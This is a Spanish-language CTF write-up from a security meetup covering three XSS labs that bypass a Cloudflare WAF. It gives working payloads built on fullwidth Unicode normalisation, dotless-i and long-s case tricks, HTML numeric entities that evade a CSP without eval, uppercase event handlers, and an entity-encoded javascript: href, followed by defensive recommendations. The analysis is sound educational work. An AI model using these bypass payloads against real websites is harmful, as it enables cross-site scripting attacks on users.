# Cloudflare XSS WAF Bypass — RedTeamRD Challenge
### ctf.xss-meetup.date · Análisis técnico para el meetup

---

## Contexto

Este CTF presenta tres labs de XSS donde el input del usuario pasa primero por el WAF de Cloudflare y luego por el servidor antes de ser reflejado en una página HTML. El objetivo en cada lab es ejecutar `alert(1)` dentro de un iframe sandboxed que usa `frame.js` para detectar la llamada.

**Arquitectura común:**
```
Usuario → Cloudflare WAF → Servidor (transformaciones) → /render/N → iframe sandbox
```

El iframe tiene siempre: `sandbox="allow-scripts allow-modals"` sin `allow-same-origin`, y CSP `script-src 'self' 'unsafe-inline'` sin `unsafe-eval`.

---

## La regla central del WAF

Antes de arrancar con los labs, hay que entender qué detecta Cloudflare. La regla principal para event handlers es una regex del tipo:

```
on[a-z]+=
```

Solo detecta la secuencia `on` seguida de **letras ASCII minúsculas continuas** (`a-z`, códigos 97–122) seguida de `=`. Este detalle es el hilo del que se tira en los tres labs.

---

## Lab 1 — Unicode Fullwidth Normalization

**Payload bloqueado:**
```html
<img src=x onerror=alert(1)>
```

**Problema:** el WAF detecta `<` (U+003C) como apertura de tag y `onerror=` como event handler.

### ¿Qué filtra Cloudflare aquí?

El WAF inspecciona el input en texto crudo tal como llega en la URL. Busca literales ASCII: `<`, `>`, `on[a-z]+=`, `javascript:`, etc.

### El bypass: Fullwidth Unicode

Unicode tiene versiones "fullwidth" de los caracteres ASCII para compatibilidad con sistemas CJK:

| Char | Unicode | Código |
|------|---------|--------|
| `＜` | U+FF1C  | `%EF%BC%9C` |
| `＞` | U+FF1E  | `%EF%BC%9E` |

El servidor aplica normalización Unicode (`unicodedata.normalize()` en Python, o equivalente) **después** de que el WAF ya inspeccionó el input. Resultado: el WAF ve `＜` (no es `<` ASCII) y lo deja pasar; el servidor lo convierte a `<` real antes de insertarlo en el HTML.

**Payload final:**
```
＜img src=x onerror=alert(1)＞
```

**URL:**
```
?q=%EF%BC%9Cimg%20src%3Dx%20onerror%3Dalert(1)%EF%BC%9E
```

**Cadena del bypass:**
```
WAF ve:      ＜img src=x onerror=alert(1)＞   ← no reconoce ＜＞ como HTML
Servidor:    <img src=x onerror=alert(1)>    ← normaliza Unicode → ASCII
Browser:     ejecuta onerror=alert(1)
```

---

## Lab 2 — Server-side toUpperCase + CSP sin eval

Este lab apila tres obstáculos simultáneos.

**Obstáculos:**
1. El servidor aplica `.toUpperCase()` a todo el parámetro `q=`
2. El WAF bloquea `on[a-z]+=`
3. El iframe tiene CSP que bloquea `unsafe-eval` → `Function(string)()` no funciona

### Obstáculo 1: toUpperCase destruye el código JS

Si enviamos `alert(1)` en un event handler, el servidor lo convierte a `ALERT(1)`. `ALERT` no existe como función global → error. Todo identificador con minúsculas queda inutilizado.

### Obstáculo 2: WAF bloquea event handlers

La regex `on[a-z]+=` detecta `onerror=`, `onfocus=`, `onpointerover=`, etc.

**Bypass con Unicode toUpperCase:**

Existen dos caracteres Unicode BMP (< U+FFFF) que `.toUpperCase()` convierte a una sola letra ASCII mayúscula:

| Char | Unicode | `.toUpperCase()` | Nombre |
|------|---------|-----------------|--------|
| `ı`  | U+0131  | `I`             | Dotless i (turco) |
| `ſ`  | U+017F  | `S`             | Long s (germánico antiguo) |

Usos concretos:
- `<ınput>` → servidor → `<INPUT>` → browser parsea como tag válido
- `onfocuſ=` → servidor → `ONFOCUS=` → event handler válido, WAF no detecta (`ſ` no es `[a-z]`)
- `onpoınterover=` → servidor → `ONPOINTEROVER=` → válido, WAF no detecta (`ı` en posición de `i`)

Por qué `onpointerover` y no `onfocus`: el `autofocus` en iframes cross-origin sandboxed no dispara en Chrome sin interacción del usuario. `onpointerover` dispara al pasar el mouse sin click.

### Obstáculo 3: el código JS queda en mayúsculas y sin eval

Si enviamos `alert(1)` en el atributo, el servidor lo uppercasea a `ALERT(1)`. No funciona.

No podemos usar `Function("alert(1)")()` porque el CSP bloquea `unsafe-eval`.

**Bypass: HTML numeric entities**

Las entidades numéricas `&#97;` (= 'a'), `&#108;` (= 'l'), etc. contienen solo dígitos y símbolos. El servidor no los toca con `toUpperCase`. El browser HTML-decodifica los atributos **antes** de ejecutar el JS.

```
a=&#97;  l=&#108;  e=&#101;  r=&#114;  t=&#116;
```

Esto no usa `eval` ni `Function()` — es el HTML parser del browser decodificando antes de que el JS engine siquiera arranque. Funciona con solo `unsafe-inline`.

**Payload final:**
```html
<ınput onpoınterover="&#97;&#108;&#101;&#114;&#116;(1)">
```
*(donde `ı` = U+0131 en el tag name y en el event name)*

**Cadena completa:**
```
Input:    <ınput onpoınterover="&#97;&#108;&#101;&#114;&#116;(1)">
WAF:      no detecta (ı no es [a-z], no hay on[a-z]+= )
toUpper:  <INPUT ONPOINTEROVER="&#97;&#108;&#101;&#114;&#116;(1)">
Browser:  <INPUT ONPOINTEROVER="alert(1)">  ← hover → alert(1)
```

---

## Lab 3 — HTML Sanitizer Whitelist + Case bypass

Este lab cambia la lógica del servidor. Ya no hay `toUpperCase` — en cambio hay un **sanitizador HTML whitelist**.

**CSP del iframe:**
```
sandbox allow-scripts allow-modals; default-src 'none';
script-src 'self' 'unsafe-inline'; form-action 'none'; ...
```

**Tags que pasan el WAF y el sanitizador:** `<div>`, `<p>`, `<a href>`, `<span>`, `<b>`, `<p style>`

**Tags bloqueados:** `<input>`, `<img>`, `<svg>`, `<script>`, `<form>`, `<meta>`, `<style>`, `<marquee>`

### ¿Por qué las técnicas del Lab 2 no sirven aquí?

En Lab 2, el servidor hacía toUpperCase, lo que convertía `onfocuſ` → `ONFOCUS`. Sin esa conversión, el browser no reconoce `onfocuſ` como event handler. El truco del Lab 2 dependía del servidor para completar la transformación.

### Bypass: Event handler en MAYÚSCULAS

El WAF detecta `on[a-z]+=` — solo letras **ASCII minúsculas**. `ONPOINTEROVER=` tiene solo mayúsculas ASCII → **el WAF no lo detecta**.

El sanitizador HTML del servidor normaliza atributos a lowercase → `onpointerover` llega al DOM.

```
Input:     <a ONPOINTEROVER="alert(1)">test</a>
WAF:       no detecta (ONPOINTEROVER no matchea on[a-z]+=)
Servidor:  <a onpointerover="alert(1)">test</a>  ← sanitizador lowercasea
Browser:   hover → alert(1)
```

**Variantes equivalentes:** `ONFOCUS=`, `ONCLICK=`, `ONMOUSEOVER=` — todas pasan.

### Bonus: HTML entity en href javascript:

Durante la exploración se descubrió otro vector. El WAF bloquea `javascript:` como cadena literal, pero no las entidades:

```html
<a href="&#106;avascript:alert(1)">click</a>
```

`&#106;` = 'j' → el browser decodifica el href a `javascript:alert(1)`. Pasó el WAF y el sanitizador. Sin embargo, Chrome bloquea la navegación `javascript:` dentro de iframes sandboxed, así que este vector quedó descartado en favor del event handler uppercase.

**Payload final:**
```html
<a ONPOINTEROVER="alert(1)">pasa el mouse</a>
```

**URL:**
```
?q=%3Ca+ONPOINTEROVER%3D%22alert(1)%22%3Epasa+el+mouse%3C%2Fa%3E
```

---

## Tabla comparativa de los tres labs

| | Lab 1 | Lab 2 | Lab 3 |
|---|---|---|---|
| **Transformación del servidor** | Normaliza Unicode | `.toUpperCase()` | Sanitizador HTML whitelist |
| **Bypass del WAF** | Fullwidth Unicode `＜＞` | `ı`/`ſ` en event name | Event handler en MAYÚSCULAS |
| **Bypass del servidor** | Servidor normaliza `＜` → `<` | Servidor uppercasea `ı` → `I` | Servidor lowercasea atributos |
| **Bypass del CSP** | N/A | HTML entities `&#97;...` | `alert(1)` directo |
| **Trigger** | Auto (`onerror`) | Hover (`onpointerover`) | Hover (`onpointerover`) |

---

## Anatomía del WAF: qué detecta y qué no

### Patrones confirmados que Cloudflare detecta en este CTF

```
on[a-z]+=          → event handlers en minúsculas
javascript:         → URLs javascript: literales
<script            → tag script
<img               → tag img (y similares "peligrosos")
<input             → tag input
<form              → tag form
<svg               → tag svg
<meta              → tag meta
console            → la palabra console (posiblemente más globales JS)
```

### Por qué la regex `on[a-z]+=` tiene puntos ciegos

La regex asume que los event handlers solo contienen letras ASCII minúsculas. Esto es verdad en HTML estándar — pero HTML5 dice que los nombres de atributos son case-insensitive. Entonces:

- `ONCLICK=` es un event handler válido en el browser pero no matchea `on[a-z]+=`
- `onclıck=` contiene `ı` (U+0131) que no es `[a-z]`, así que no matchea

El WAF inspecciona el texto crudo; el browser lo parsea con reglas más permisivas. Esa brecha es la superficie de ataque.

### Por qué las entidades HTML en atributos son difíciles de filtrar

`&#97;&#108;&#101;&#114;&#116;` no contiene ninguna letra. Es imposible detectar `alert` como cadena en el input sin decodificar las entidades primero. Si el WAF decodifica antes de inspeccionar, la entidad deja de ser un bypass. Si no decodifica, el texto parece inocuo. En este CTF el WAF no decodifica entidades en atributos → bypass efectivo.

---

## Nota sobre el iframe sandboxed

Los tres labs usan el mismo `frame.js` que hookea `window.alert`:

```javascript
const nativeAlert = window.alert.bind(window);
window.alert = message => {
  document.documentElement.dataset.alertCalls = ...;
  nativeAlert(message);
  celebrate();
};
```

**Para hacer debug** del JS dentro del iframe: el contexto del iframe sandboxed está aislado del frame principal en DevTools. Para ver su consola: DevTools → dropdown de contexto (arriba izquierda) → seleccionar el frame del iframe, no "top".

---

## Recomendaciones para Blue Team

### 1. No confiar solo en regex de texto crudo

La regla `on[a-z]+=` es bypasseable con:
- Mayúsculas: `ONCLICK=`
- Caracteres Unicode que el browser normaliza: `onclıck=`
- Espacios/tabs: `on click=` (algunos parsers)

**Recomendación:** normalizar el input a lowercase ASCII antes de aplicar la regex, y decodificar entidades HTML antes de inspeccionar. Mejor aún: usar un parser HTML real para extraer atributos antes de inspeccionarlos.

### 2. Sanitización server-side en whitelist estricta

El lab 3 demostró que un sanitizador HTML whitelist agresivo es una defensa efectiva: solo `div`, `p`, `a`, `span`, etc. con atributos permitidos explícitamente. Librerías recomendadas:

- **Python:** `bleach` con whitelist explícita
- **Node.js:** `DOMPurify` (JSDOM) o `sanitize-html`
- **Java:** OWASP Java HTML Sanitizer
- **Go:** `bluemonday`

El sanitizador debe normalizar atributos a lowercase y eliminar cualquier event handler (`on*`).

### 3. Content Security Policy bien configurada

El CSP del iframe fue la segunda línea de defensa clave. Sin `unsafe-eval`, el ataque con `Function(string)()` quedó bloqueado. Configuración recomendada para iframes de contenido generado por el usuario:

```
Content-Security-Policy: sandbox allow-scripts allow-modals;
  default-src 'none';
  script-src 'self';
  style-src 'self';
  img-src 'self' data:;
  connect-src 'none';
  form-action 'none';
  base-uri 'none';
```

Puntos clave:
- Sin `unsafe-inline` → bloquea event handlers inline (la protección más fuerte)
- Sin `unsafe-eval` → bloquea `eval`, `Function()`, `setTimeout(string)`
- `form-action 'none'` → bloquea `<form action="javascript:...">`
- `sandbox` en el CSP header refuerza el atributo del iframe HTML

### 4. Normalización Unicode antes de procesar

El bypass del Lab 1 funcionó porque el servidor normalizaba Unicode **después** del WAF. El orden correcto:

```
Input crudo → Decodificar entidades HTML → Normalizar Unicode → WAF/sanitización → Output
```

Si el servidor va a normalizar Unicode de todas formas (para manejar texto internacional), hacerlo antes de la inspección de seguridad elimina esa clase de bypass.

### 5. Validación en múltiples capas, nunca en una sola

El modelo de defensa de este CTF dependía del WAF como primera línea. Cuando el WAF tiene puntos ciegos, el ataque pasa directo. La defensa en profundidad implica:

```
WAF (primera línea, bloquear lo obvio)
  ↓
Sanitización server-side (whitelist, no blacklist)
  ↓
CSP estricta en el cliente (última línea)
  ↓
Sandbox de iframe (contención del daño)
```

Ninguna capa sola es suficiente. La combinación hace que el atacante tenga que encadenar bypasses en cada capa simultáneamente.

### 6. Preferir whitelist sobre blacklist

Los labs 1 y 2 tenían reglas blacklist (bloquear patrones conocidos). Los patrones conocidos siempre tienen variantes no cubiertas. El lab 3 usaba whitelist (permitir solo lo conocido como seguro) — y resultó más difícil de bypassear porque el vector final fue una propiedad del WAF, no del servidor.

En sanitización HTML: no intentes bloquear `<script>`, `onerror=`, etc. En su lugar, define exactamente qué tags y atributos son permitidos y elimina todo lo demás.

---

*RedTeamRD · xss-meetup.date · Septiembre 2026*
